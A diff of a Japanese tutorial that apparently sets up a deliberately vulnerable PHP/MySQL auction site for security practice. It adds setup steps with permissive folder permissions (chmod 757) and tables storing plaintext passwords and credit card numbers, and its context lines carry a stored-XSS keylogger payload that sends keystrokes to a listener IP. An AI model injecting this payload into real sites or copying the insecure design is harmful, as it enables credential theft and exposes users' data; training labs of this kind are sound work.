@@ -116,7 +116,6 @@ aaa<script>        var link = document.createElement('a');        link.href = 'h
 
 ```html:キーロガー（IPは各自のものに変更してください
 cc</div><script type="text/javascript">var keys='';document.onkeypress = function(e) {get = window.event?event:e;key = get.keyCode?get.keyCode:get.charCode;key = String.fromCharCode(key);keys+=key;var obj = document.getElementById("div1");obj.innerText = keys;};window.setInterval(function(){new Image().src = 'http://192.168.52.128/keylogger.php?c='+keys;keys = '';}, 1000);</script><body><div id="div1"></div></body>
-
 ```
 :::note info
 phpを出品画面でアップして、
@@ -149,3 +148,78 @@ phpを出品画面でアップして、
 │   ├── registst2.php  
 │   └── registst3.php  
 └── registst.css  
+
+## オークションサイトセットアップ方法
+
+1. php の設定を変更（デフォ設定だと、アップロードできるファイルが20ファイルまで,容量は2MBまでしかアップロードできません。）
+
+```shell:php.iniファイル変更
+sudo cp /etc/php/8.1/apache2/php.ini /etc/php/8.1/apache2/php.ini.bak
+sudo gedit /etc/php/8.1/apache2/php.ini
+```
+設定ファイルの中で「**upload_max_filesize**」の値が「2M」となっているのを「1G」に変更//1回でアップロードできるファイル容量を2MBから1GBに変更
+
+設定ファイルの中で「**post_max_size**」の値が「2M」となっているのを「1G」に変更//1回でアップロードできるファイル容量を2MBから1GBに変更
+
+「**max_file_uploads**」の値が「20」となっているのを「100」に変更 //1回でアップロードできるファイル数が20から100に変更
+
+```shell:apache再始動、ステータス確認
+sudo systemctl restart apache2
+sudo systemctl status apache2
+```
+ステータス見てActiveになっていればapacheが正常に動いている
+
+
+githubからソースコードをダウンロードして、/var/www/html/auctionに配置
+imagesの権限をwww-dataに対して書き込み権限を与える必要がある。
+
+
+```shell:images権限変更
+sudo chmod 757 /var/www/html/auction/images
+```
+
+2.データベース作成
+
+```shell:mysql起動
+sudo mysql -u root -p
+```
+
+```sql:データベース作成
+create database auction;
+```
+```sql:データベース切り替え
+use auction;
+```
+```sql:テーブル一括作成
+CREATE TABLE `User`(
+	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
+	`mail` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'メールアドレス',
+	`password` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'パスワード',
+	PRIMARY KEY (`user_id`)
+) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
+CREATE TABLE `UserAdd` (
+	`user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
+	`address` VARCHAR(255) NOT NULL DEFAULT '' COMMENT '住所',
+	`phone` VARCHAR(11) NOT NULL DEFAULT 0 COMMENT '電話番号',
+	PRIMARY KEY (`user_id`)
+) ENGINE=INNODB DEFAULT CHARSET=utf8mb3;
+CREATE TABLE `User_Credit` (
+    `user_id` VARCHAR(32) NOT NULL DEFAULT '' COMMENT 'ユーザID',
+    `credit` VARCHAR(16) DEFAULT NULL COMMENT 'クレジット番号'
+) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
+CREATE TABLE `Item` (
+    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
+    `item_name`  TEXT COMMENT 'アイテム名',
+    `item_price` INT(7) NOT NULL DEFAULT 0 COMMENT '金額',
+    `max_price` INT(7) NOT NULL DEFAULT 0 COMMENT '最高金額',
+    `buy_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '入札者',
+    `item_user` VARCHAR(32) NOT NULL DEFAULT '' COMMENT '出品者ID',
+    `is_sold` TINYINT(1) NOT NULL DEFAULT 0 COMMENT '売れたか売れてないかのフラグ',
+    `category` VARCHAR(255) NOT NULL DEFAULT '' COMMENT 'カテゴリー', -- ここにカテゴリーを追加
+    PRIMARY KEY (`item_id`)
+) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
+CREATE TABLE `Item_Image` (
+    `item_id` VARCHAR(64) NOT NULL DEFAULT '' COMMENT 'アイテムID',
+    `image_path` VARCHAR(255) NOT NULL DEFAULT ''
+) ENGINE=INNODB DEFAULT CHARSET=utf8mb4;
+```
